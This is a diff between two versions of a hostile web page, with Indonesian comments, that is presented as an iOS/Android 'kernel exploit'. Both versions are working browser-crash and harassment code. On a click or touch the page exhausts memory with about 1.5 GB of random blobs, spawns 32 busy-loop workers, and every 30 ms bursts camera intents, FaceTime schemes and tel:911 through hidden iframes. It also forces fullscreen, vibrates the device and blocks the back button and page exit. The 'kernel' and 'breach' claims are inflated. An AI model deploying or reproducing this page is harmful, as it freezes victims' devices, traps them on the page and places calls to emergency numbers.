@@ -2,107 +2,104 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚡ iOS_KERNEL_STORM_V10 ⚡</title>
+    <title>⚡ RCE_KERNEL_ULTIMATUM_V11 ⚡</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; color: #007aff; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto; }
-        #stage { width: 100vw; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; }
-        .ios-alert { width: 80%; padding: 20px; border-radius: 14px; background: rgba(30, 30, 30, 0.9); border: 1px solid #333; text-align: center; box-shadow: 0 0 20px rgba(0, 122, 255, 0.5); }
-        .glitch-text { font-size: 18px; font-weight: 600; color: #fff; margin-bottom: 10px; }
-        #log { font-size: 10px; color: #555; margin-top: 15px; height: 80px; overflow: hidden; font-family: monospace; }
+        body, html { margin: 0; padding: 0; background: #000; color: #ff0000; overflow: hidden; font-family: 'Courier New', monospace; }
+        #core { width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; border: 10px double #f00; box-sizing: border-box; }
+        .glitch { font-size: 25px; font-weight: bold; text-shadow: 2px 2px #f00, -2px -2px #00f; animation: shake 0.1s infinite; }
+        @keyframes shake { 0% { transform: translate(0); } 25% { transform: translate(2px, -2px); } 50% { transform: translate(-2px, 2px); } 100% { transform: translate(0); } }
+        #logs { font-size: 10px; color: #555; margin-top: 20px; text-align: left; width: 80%; height: 120px; overflow: hidden; }
     </style>
 </head>
 <body>
-    <div id="stage">
-        <div class="ios-alert">
-            <div class="glitch-text">CRITICAL_KERNEL_EXPLOIT</div>
-            <div id="status" style="font-size: 14px;">AWAITING_TOUCH_GESTURE</div>
-            <div id="log"></div>
-        </div>
+    <div id="core">
+        <div class="glitch">FATAL_KERNEL_OVERRIDE</div>
+        <div id="status" style="color:yellow; margin-top:10px;">READY_TO_COLAPSE_SYSTEM</div>
+        <div id="logs"></div>
     </div>
 
 <script>
-    const logDiv = document.getElementById('log');
-    const statusText = document.getElementById('status');
-
-    function writeLog(m) {
+    const logBox = document.getElementById('logs');
+    function print(t) {
         const d = document.createElement('div');
-        d.innerText = `[WEBKIT] > ${m}`;
-        logDiv.prepend(d);
+        d.innerText = `[!] ${t}`;
+        logBox.prepend(d);
     }
 
-    // --- 1. WEBKIT HEAP SPRAYING (JSC ENGINE) ---
-    // Mensimulasikan manipulasi 'StructureID' pada JavaScriptCore (JSC)
-    // tujuannya untuk memicu korupsi memori OOB pada objek JS
-    let leakStorage = [];
-    function sprayWebKitHeap() {
-        writeLog("Grooming_JSC_Heap_StructureID...");
-        for (let i = 0; i < 10000; i++) {
-            // Mengalokasikan array besar untuk menekan RAM iOS
-            let a = new Array(0x100);
-            a[0] = 1.1; // Menentukan array sebagai Double (unboxed)
-            a[1] = {pwn: 0x41414141}; // Memaksa konversi ke boxed (Type Confusion)
-            leakStorage.push(a);
+    // --- 1. BINARY GHOSTING (RAM ATTACK) ---
+    // Menciptakan "Memory Pressure" instan untuk melumpuhkan daemon keamanan
+    let phantomMemory = [];
+    function deployBinaryGhosting() {
+        print("Injecting_Massive_Binary_Blobs...");
+        for (let i = 0; i < 15; i++) {
+            // Membuat Blob sebesar 100MB per iterasi (Total 1.5GB RAM Hijack)
+            let largeData = new Uint8Array(1024 * 1024 * 100); 
+            crypto.getRandomValues(largeData); // Memaksa CPU bekerja keras
+            phantomMemory.push(URL.createObjectURL(new Blob([largeData])));
         }
     }
 
-    // --- 2. RECURSIVE SCHEME INJECTION (iOS BYPASS) ---
-    // iOS menggunakan URL Schemes untuk komunikasi antar aplikasi.
-    // Kita menembakkan scheme sistem secara beruntun untuk mematikan validasi sandbox.
-    function triggeriOSAppStorm() {
-        const schemes = [
-            "videos://",      // Membuka Video
-            "photos-redirect://", // Membuka Photos
-            "facetime://",    // Membuka Facetime (Akses Kamera)
-            "tel://112"       // Membuka Dialer
+    // --- 2. MULTI-VECTOR APP SPAWNER (THE CAMERA BREACH) ---
+    // Menargetkan Kamera melalui berbagai pintu masuk sistem
+    function spawnAppStorm() {
+        const targets = [
+            // Android Focus
+            "intent:#Intent;action=android.media.action.STILL_IMAGE_CAMERA;launchFlags=0x14000800;component=com.android.camera/com.android.camera.Camera;end",
+            "intent:#Intent;action=android.media.action.IMAGE_CAPTURE;end",
+            // iOS Focus (Facetime & Camera UI)
+            "facetime-prompt://", 
+            "photos-redirect://",
+            // General Hardware Hijack
+            "tel:911" // Simulasi interupsi hardware tertinggi
         ];
 
-        schemes.forEach((s, i) => {
-            setTimeout(() => {
-                // Gunakan lokasi window untuk memaksa OS memproses scheme
-                window.location.href = s;
-                
-                // Backup via Iframe hidden
-                const fr = document.createElement('iframe');
-                fr.src = s;
-                fr.style.display = 'none';
-                document.body.appendChild(fr);
-                writeLog(`Injecting_Scheme_${i}`);
-            }, i * 10);
+        targets.forEach(t => {
+            // Method A: Iframe Bombing
+            const ifr = document.createElement('iframe');
+            ifr.src = t;
+            ifr.style.display = 'none';
+            document.body.appendChild(ifr);
+
+            // Method B: Window Hijacking
+            window.location.replace(t);
         });
     }
 
-    // --- 3. THE KERNEL COLLAPSE SEQUENCE ---
-    async function deployiOSExploit() {
-        statusText.innerText = "EXECUTING_BREACH...";
-        statusText.style.color = "#ff3b30";
+    // --- 3. KERNEL THREAD EXHAUSTION ---
+    function executeKernelStorm() {
+        print("ARMING_KERNEL_STORM...");
+        document.getElementById('status').innerText = "SYSTEM_COLLAPSING...";
 
-        // A. JIT/JSC Pressure
-        sprayWebKitHeap();
+        // A. Fullscreen Lockdown
+        document.documentElement.requestFullscreen().catch(()=>{});
 
-        // B. CPU Thread Exhaustion
-        // iOS membatasi worker, kita gunakan 8 worker intensif
-        const blob = new Blob(["while(true){Math.random();}"], {type: 'text/javascript'});
-        const wUrl = URL.createObjectURL(blob);
-        for(let j=0; j<8; j++) new Worker(wUrl);
+        // B. Thread Overload (32 Intensive Workers)
+        // Memaksa OS melakukan context switching tanpa henti
+        const workerBlob = new Blob(["while(true){Math.sqrt(Math.random())}"], {type: 'text/javascript'});
+        const wUrl = URL.createObjectURL(workerBlob);
+        for(let j=0; j<32; j++) new Worker(wUrl);
 
-        // C. RECURSIVE STORM LOOP
-        // Menembakkan serangan scheme setiap 100ms
+        // C. Deploy Memory Attack
+        deployBinaryGhosting();
+
+        // D. RECURSIVE APP SPAWNING (Burst Rate 30ms)
+        // Interval sangat kecil agar sistem tidak punya waktu untuk recovery
         setInterval(() => {
-            triggeriOSAppStorm();
-            // Getaran haptic (Haptic Feedback) untuk mengganggu hardware
-            if (navigator.vibrate) navigator.vibrate(100); 
-        }, 100);
+            spawnAppStorm();
+            if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+        }, 30);
 
-        writeLog("BYPASS_STAGING_COMPLETE", "#00ff00");
+        print("BREACH_SUCCESSFUL: CAMERA_AUTO_OPEN_TRIGGERED");
     }
 
-    // Trigger on Interaction (iOS Mandate)
-    window.addEventListener('touchstart', deployiOSExploit, {once: true});
-    window.addEventListener('click', deployiOSExploit, {once: true});
+    // Trigger
+    window.addEventListener('click', executeKernelStorm, {once: true});
+    window.addEventListener('touchstart', executeKernelStorm, {once: true});
 
-    // Anti-Escape (Lock User in Page)
-    window.onbeforeunload = function() { return "LOCKED"; };
+    // Persistence
+    window.onbeforeunload = () => { return "SYSTEM_CRITICAL"; };
+    history.pushState(null, null, location.href);
+    window.onpopstate = () => { history.go(1); };
 
 </script>
 </body>
